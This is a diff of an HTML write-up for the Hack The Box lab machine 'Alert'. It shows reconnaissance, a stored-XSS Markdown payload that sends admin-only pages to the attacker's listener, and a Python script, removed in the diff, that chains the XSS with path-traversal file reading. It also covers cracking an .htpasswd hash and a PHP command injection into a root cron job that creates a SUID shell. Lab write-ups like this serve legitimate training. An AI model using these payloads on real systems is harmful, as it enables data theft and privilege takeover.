@@ -3,425 +3,250 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alert</title>
+    <title>Alert - Writeup</title>
     <style>
+        /* Global Reset */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-            margin: 20px auto;
-            border: 1px solid #30363d;
-            border-radius: 4px;
-            }
-        
         body {
             background-color: #0d1117;
-            color: #79c0ff;
+            color: #c9d1d9;
             font-family: 'Courier New', monospace;
             line-height: 1.6;
             display: flex;
             flex-direction: column;
-            align-items: center; /* Centers the header/title */
-            padding: 20px;
+            align-items: center;
+            padding: 40px 20px;
         }
 
-        /* This is your main centered box */
+        /* Titles */
+        h1, h2, h3 { color: #79c0ff; text-align: center; margin-bottom: 10px; }
+        .step-header {
+            color: #ff7b72;
+            border-bottom: 1px solid #30363d;
+            margin: 40px 0 20px 0;
+            padding-bottom: 5px;
+            font-size: 1.4em;
+        }
+
+        /* Layout Container */
         .container {
-        display: flex; 
+            display: flex;
             justify-content: center;
-            align-items: flex-start; 
-            gap: 30px; /* Increased gap between main box and sidebar */
-            margin: 0 auto; 
-            padding: 30px 30px; /* Adds 40px padding to left and right */
-            max-width: 1200px; /* Prevents the whole layout from becoming too wide */
+            align-items: flex-start;
+            gap: 40px;
+            max-width: 1100px;
             width: 100%;
+            margin-top: 30px;
         }
 
         .main-content {
-        background-color: #0d1117;
+            background-color: #161b22;
             border: 1px solid #30363d;
-            border-radius: 6px;
-            padding: 30px;
-            /* Removed flex-shrink: 0 to allow responsiveness */
-            max-width: 700px; /* Reduced from 800px as requested */
-            width: 100%;
+            border-radius: 8px;
+            padding: 40px;
+            flex: 1;
+            max-width: 800px;
+        }
 
-            
+        /* Sidebar & Sticky Nav */
+        .sidebar {
+            flex: 0 0 150px;
+            align-self: stretch;
+        }
+
+        .sticky-nav {
+            position: sticky;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .nav-btn {
+            background-color: #21262d;
+            border: 1px solid #30363d;
+            color: #58a6ff;
+            padding: 12px;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            transition: all 0.2s;
+        }
+
+        .nav-btn:hover {
+            background-color: #30363d;
+            border-color: #8b949e;
+            color: #79c0ff;
+        }
+
+        /* Terminal & Copy Button Logic */
+        .terminal-wrapper {
+            position: relative;
+            margin: 20px 0;
         }
 
         .terminal-box {
-            display: block; /* Changed from inline-block to block to prevent side-by-side issues */
-            background-color: #000000; 
-            color: #00FF00; 
-            padding: 15px; 
-            border-radius: 8px; 
-            font-family: 'Courier New', Courier, monospace;
-            border: 1px solid #333;
-            margin: 20px 0;
-            overflow-x: auto; /* Adds a scrollbar if the code line is too long */
-        }
-
-        h1, h2, h3 {
-            color: #79c0ff;
-            text-align: center; /* Centers your titles */
-            width: 100%;
-        }
-
-        p {
-            margin: 15px 0;
-            color: #8b949e;
-        }
-
-        a { color: #58a6ff; text-decoration: none; }
-        a:hover { text-decoration: underline; }
-
-        .sticky-element {
-            /* Keeps everything centered in the sticky note */
-            text-align: center;
-            position : sticky;
-            top: 20px;
+            background-color: #000000;
+            color: #39ff14;
             padding: 15px;
-            }
-        
-        .sidebar {
-        flex: 0 1 250px; /* Grow: 0, Shrink: 1, Ideal width: 250px */
-            position: sticky;
-            top: 20px;
-        }       
-        
+            padding-right: 65px; 
+            border-radius: 6px;
+            border: 1px solid #30363d;
+            font-size: 0.9em;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(121, 192, 255, 0.1);
+            border: 1px solid #30363d;
+            color: #79c0ff;
+            padding: 5px 10px;
+            font-size: 11px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .copy-btn:hover {
+            background: #79c0ff;
+            color: #0d1117;
+        }
+
+        /* Flags & Lists */
+        fieldset {
+            border: 1px solid #3fb950;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            background: rgba(63, 185, 80, 0.05);
+        }
+        legend { color: #3fb950; padding: 0 10px; font-weight: bold; }
+
+        ul { margin-left: 25px; margin-bottom: 15px; }
+        li { margin-bottom: 8px; color: #8b949e; }
+
+        img {
+            max-width: 100%;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
 
     <h1>Hack The Box</h1>
     <h2>Alert</h2>
-    <img src="/pngs/HTB/Easy/Alert/Alert.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Alert.png" style="border: none;">
-    <h2>Easy</h2>
-    <br><br>
+    <img src="/pngs/HTB/Easy/Alert/Alert.png" alt="Alert Banner" style="border:none; width: 300px;">
+    <h3>Level: Easy</h3>
 
     <div class="container">
         <div class="main-content">
-            <p>I started with port enumeration.</p>
+            <h3 class="step-header">1. Reconnaissance</h3>
+            <p>I started with port enumeration:</p>
+            <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.44</div>
+            
+            <ul>
+                <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
+                <li><strong>-sS</strong>: SYN stealth scan.</li>
+                <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
+            </ul>
 
-            <div class="terminal-box">
-                sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.44
-            </div>
-  <br>
-<ul>
-    <li>" -p- --open " : scans all ports and shows us which are open</li>
-    <li>" -sS " : SYN scan.</li>
-    <li>" --min-rate 5000 " : how many packets should be sent simultaneously.</li>
-    <li>" -vvv " : increases the verbosity of the scan , which displays more detailed information.</li>
-    <br>
-    To have a clear view of the SYN scan we add these : <br>
-    <li>" -Pn " : disables ICMP Echo request.</li>
-    <li>" -n " : disables DNS resolution</li>
-</ul>
+            <p>Ports 22 (SSH) and 80 (HTTP) are open. Service scan:</p>
+            <div class="terminal-box">nmap -sC -sV -p22,80 10.10.11.44</div>
 
-<br><br>
+            <p>The domain is <code>alert.htb</code>. I updated my <code>/etc/hosts</code> and performed vhost enumeration:</p>
+            <div class="terminal-box">ffuf -w subdomains.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10</div>
+            <p>Found a <code>statistics</code> subdomain that requires authentication.</p>
 
-I found ports 22 and 80 open and enumerated them. <br><br>
+            <h3 class="step-header">2. Web Exploitation (XSS to LFI)</h3>
+            <p>On the main site, the "Markdown Viewer" allows uploading <code>.md</code> files. I discovered that it is vulnerable to XSS. I crafted a payload to leak <code>messages.php</code> via the administrator's session:</p>
 
-<div class="terminal-box">
-nmap -sC -sV -p80,22 10.10.11.44
-</div> <br>
-<ul>
-    <li>" -sC " : executes default scripts</li>
-    <li>" -sV " : scans for service detection.</li>
-</ul><br>
-Where I found that the domain name was "alert.htb". Next I had to configure the "/etc/hosts" file.
-<br>
-<div class="terminal-box">
-sudo open /etc/hosts
-
-10.10.11.44 alert.htb
-</div><br><br>
-
-I also did vhost enumerating and I found the "statistics" subdomain.<br>
-
-<div class="terminal-box">
-ffuf -w ~/Downloads/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10
-</div>
-<br><br>
-
-I tried to connect there but I needed credentials. Back to our http server. 
-<br>
-I can see that there is a upload file directory, where I can upload only ".md" files.<br>
-<br>
-<img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523185001.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Pasted%20image%2020250523185001.png">
-<br>
-I found also that at "About us" tab we get a message.<br>
-<br>
-<img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190321.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190321.png">
-<br>
-The administrator checks the contact messages at "Contact us".
-<br>
-
-So step by step we check our tabs.<br>
-First we will check the uploading tab "Markdown Viewer".
-I sent a ".md" file which I created and I can see that this was a little weird, because after I got redirected the contents of the file was displayed.
-<img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190634.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190634.png">
-<br><br>
-Like this I understood that this was a "XSS" vulnerability.
-<br>
-<div class="terminal-box">
-    <pre><code>&lt;script&gt;
-    fetch('http://alert.htb/messages.php')
-    .then(resp =&gt; resp.text())
-    .then(body =&gt; {
-        fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body));
-    })
-    &lt;/script&gt;</code></pre>
-    </div><br>
-
-    Let's explain : <br>
-    <ul>
-    <li>fetch('http://alert.htb/messages.php')</li><br> 
-    This line makes a HTTP GET request to "http://alert.htb/messages.php".<br>
-    It's attempting to retrieve the content of that page.<br><br>
-
-    <li>.then(resp => resp.text())</li><br>
-    
-    It processes the response and converts it to plain text (`resp.text()`), instead of JSON or binary.<br>
-    "body" will now contain the full HTML/text content returned by the page.<br><br>
-        
-    <li>.then(body => { ... })</li><br>
-    In this block, it takes the text content ("body") and does the following:<br>
-    <br>
-    <li>fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body));</li>
-    <ul>
-    <br>
-    <li>fetch("http://10.10.14.22:9200/</li><br>
-    This creates a GET request to our IP with the specific port which our listener is set.
-    <br>
-<div class="terminal-box">
-python3 -m http.server 9200
-    </div><br>
-
-    <li>btoa(body)</li><br>
-    It encodes the content using "btoa(body)" (Base64 encoding), so it can be safely included in a URL and sends the encoded data to the remote server.<br>
-    <br>
-    <li>/exfil?body=... </li><br>
-    Here is the exfiltration part where it leaks the content of "messages.php" to our listener.
-<br>
-</ul>
-</ul>
-
-It redirect us to "visualizer.php" <br>
-<div class="terminal-box">
-http://alert.htb/visualizer.php
-</div>
-<br>
-If we click "CTRL+U" to check the source-code we can see that the file was saved with a different name.<br> 
-<img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523185209.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Pasted%20image%2020250523185209.png"><br>
-
-I started enumerating for more directories and I found out about "messages.php"<br>
-Once I search for this ".php" file I can see that it is blank. But maybe for the administrator it is not.<br>
-So I found a script and I uploaded it, to check the contents of "messages.php" as administrator.
-<br>
-I found out that there is a vulnerability at "contact us" page, where I could write a message and I would get a response to my listening server.<br>
-<img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190044.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190044.png"><br> 
-<br>Here is the listener:<br>
-<img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190108.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190108.png"><br>
-
-Combining all the above I upload the script discussed as "payload.md", open a listener and copy-paste the link that I found at source code. 
-<br><br>
-"http://alert.htb/visualizer.php?link_share=6830997ae06754.83998933.md"<br>
-<br>
-The admin will check the link and this will trigger the file which will send me the content of "messages.php" from the view of admin. 
-<br>
-<img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523191831.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Pasted%20image%2020250523191831.png">
-<br>
-Then I decrypt the Base64 encrypted message.<br>
-<div class="terminal-box">
-<xmp>
-echo "PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg==" | base64 -d
-
-<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
-</xmp>
-</div><br>
-
-So we can see that there is a ".txt" file there.
-<br>
-We can also see that there is a "messages.php?file=..." parameter so we can try to check for file inclusion vulnerability.<br>
-I found this python script.<br>
-<div class="terminal-box">
-<xmp>
-import requests
-import re
-import socket
-import sys
-
-
-if len(sys.argv) != 2:
-    print(f"usage: {sys.argv[0]} <target url>")
-    sys.exit()
-target = sys.argv[1] if sys.argv[1].startswith('http') else f'http://alert.htb/messages.php?file=../../../../{sys.argv[1]}'
-
-# generate markdown
-markdown = f"""### load script
-<script>
-fetch('{target}')
-.then(resp => resp.text())
-.then(body => {{fetch("http://10.10.14.22/exfil", {{ method: "POST", body: body}});}})
-</script>
-"""
-
-# upload markdown
-files = {"file": ("payload.md", markdown)}
-resp = requests.post("http://alert.htb/visualizer.php", files=files)
-
-# get share link
-m = re.search(r"http://alert\.htb/visualizer\.php\?link_share=.*\.md", resp.text)
-if not m:
-    print("error: share link not in page")
-    sys.exit()
-share_link = m.group()
-
-# send link to admin
-data = {"email": "0xdf@alert.htb", "message": f"Check out this link: {share_link}"}
-resp = requests.post("http://alert.htb/contact.php", data=data)
-
-# get XSS resp
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind(("0.0.0.0", 80))
-    sock.listen(1)
-    conn, addr = sock.accept()
-    with conn:
-        req = b""
-        while True:
-            chunk = conn.recv(4096)
-            if not chunk:
-                break
-            req += chunk
-
-# print data
-body = req.decode("utf-8").split("\r\n\r\n")[1]
-print(body)
-</xmp>
-</div><br>
-
-The second time that I tried to use this script it didn't work, so I did it manually. 
-I searched for the hostname and then again I repeated what we did earlier.<br><br>
-<div class="terminal-box">
-<xmp>
-<script>
-fetch('http://alert.htb/messages.php?file=../../../etc/hostname')
+            <div class="terminal-box">&lt;script&gt;
+fetch('http://alert.htb/messages.php')
 .then(resp => resp.text())
 .then(body => {
     fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body));
 })
-</script>
-</xmp>
-</div> <br>
-<br>
+&lt;/script&gt;</div>
 
-Where I found that there is a default configuration file for apache.<br>
-"/etc/apache2/sites-enabled/000-default.conf"<br>
-There we can find some useful info.<br>
-<img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523195535.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Pasted%20image%2020250523195535.png"><br>
-If we read this file with the same way we can see the password for a user.<br><br>
-<div class="terminal-box">
-sudo python3 script.py /var/www/statistics.alert.htb/.htpasswd
-<br><br>
-albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
-<br> <br>
-hashcat albert.hash --user ~/Downloads/SecLists/Passwords/Leaked-Databases/rockyou.txt 
-</div><br>
-<br>
-  <fieldset style="width: fit-content;">
-    <legend>Credentials</legend>
-    albert:manchesterunited
-</fieldset>
-<br>
+            
 
-We can now connect to port 22 with ssh with these credentials and get the flag.
+            <p>I sent the share link to the admin via the "Contact Us" form. The admin's visit triggered the script, exfiltrating the base64 content of <code>messages.php</code> to my listener.</p>
 
-<fieldset style="width: fit-content;">
-    <legend>User Flag</legend>
-    5e08a222ac9809e502410937ed638862
-</fieldset>
-<br>
-<br>
-Now we need to find a way for privillege escalation.<br> 
+            <p>Decoding the data revealed a hidden file path:</p>
+            <div class="terminal-box">echo "PGgxPk1lc3NhZ2VzPC9oMT4..." | base64 -d</div>
 
-We can't run anything with "sudo". <br>
-If we use the "id" command we can see that we are part of the management" group.<br>
-If we search for a file that we have write permissions as "management" group we can find this "/opt/website-monitor/config/configuration.php" file. <br>
-<br>
-<div class="terminal-box">
-find / -group management 2>/dev/null
-</div>
-<br>
-We can see that this file contains this : 
+            <h3 class="step-header">3. Initial Access</h3>
+            <p>Using the LFI vulnerability, I read the Apache configuration and found the <code>.htpasswd</code> file for the statistics subdomain:</p>
+            <div class="terminal-box">albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</div>
 
-<fieldset style="width: fit-content;">
-    <legend>configuration.php</legend>
-    <xmp>
-<?php
-define('PATH', '/opt/website-monitor');
-?>
-</xmp>
-</fieldset>
-<br>
+            <p>Cracked the hash using <code>hashcat</code>:</p>
+            <fieldset>
+                <legend>Credentials</legend>
+                <code>albert:manchesterunited</code>
+            </fieldset>
 
+            <h3 class="step-header">4. Privilege Escalation</h3>
+            <p>Checking group memberships:</p>
+            <div class="terminal-box">id</div>
+            <p>Albert is part of the <code>management</code> group. I found a writable configuration file used by a root cronjob:</p>
+            <div class="terminal-box">find / -group management 2>/dev/null</div>
 
-If we check "/opt/website-monitor/monitor.php" we can see that this script is running by root each minute and the "$PATH" is defined by the "configuration.php".<br>
+            <p>I injected a command into <code>/opt/website-monitor/config/configuration.php</code> to create a SUID bash binary:</p>
+            <div class="terminal-box">&lt;?php 
+define('PATH', '/opt/website-monitor'); 
+system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;'); 
+?&gt;</div>
 
-So what we have to do is to add some magic to the "configuration.php" and spawn a shell with root privileges.<br>
-<div class="terminal-box">
-<xmp>
-<?php define('PATH', '/opt/website-monitor'); system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;'); ?>
-</xmp>
-</div><br><br>
+            <p>After the cronjob ran, I executed the binary with <code>-p</code> to get root:</p>
+            <div class="terminal-box">/tmp/damn -p</div>
 
-This script allows a standard user to gain permanent, full root access.<br>
-<ul>
-    <li> define('PATH', '/opt/website-monitor');</li>
-    This line defines a constant named PATH.<br><br>
-    <li>The system function in PHP tells the server to execute commands directly in the terminal.</li>
-    <br>
-    <ul>
-        <li>cp /bin/bash /tmp/damn</li>
-        Copies the system's command shell (bash) to the /tmp folder and renames the copy to damn.<br><br>
-        <li>chown root:root /tmp/damn</li>
-        Attempts to change the owner of this new file to the root user.<br><br>
-        <li>chmod 6777 /tmp/damn</li>
-        This is the most dangerous part. It sets "special permissions" (the 6 at the start) and "universal permissions" (777).<br>
-    </ul>
-</ul><br>
+            <fieldset>
+                <legend>Root Flag</legend>
+                <code>65383dc809d3cec5c567740343688722</code>
+            </fieldset>
+        </div>
 
-The chmod 6777 command sets the SUID bit.<br>
-When a file has the SUID bit set and is owned by root, anyone who runs that file executes it with root privileges.<br>
-
-To pop a root shell now we have to use this command :<br><br>
-<div class="terminal-box">
-/tmp/damn -p
-</div><br>
-
-<img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250525213818.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Pasted%20image%2020250525213818.png"><br>
-
-Like this we move to root directory and read the flag.
-<br>
-<fieldset style="width: fit-content;">
-    <legend>Root Flag</legend>
-    65383dc809d3cec5c567740343688722
-</fieldset>
-<br>
-</div>
         <aside class="sidebar">
-            <div class="sticky-element">
-                <a href="/index.html"><h3>Home</h3></a>
-                <a href="/machines.html"><h3>Machines</h3></a>
-            </div>
+            <nav class="sticky-nav">
+                <a href="/index.html" class="nav-btn">Home</a>
+                <a href="/machines.html" class="nav-btn">Machines</a>
+            </nav>
         </aside>
     </div>
+
+    <script>
+        document.querySelectorAll('.terminal-box').forEach((box) => {
+            const wrapper = document.createElement('div');
+            wrapper.className = 'terminal-wrapper';
+            box.parentNode.insertBefore(wrapper, box);
+            wrapper.appendChild(box);
+
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.innerText = 'Copy';
+
+            btn.addEventListener('click', () => {
+                const text = box.innerText;
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.innerText = 'Copied!';
+                    setTimeout(() => { btn.innerText = 'Copy'; }, 2000);
+                });
+            });
+            wrapper.appendChild(btn);
+        });
+    </script>
 </body>
 </html>
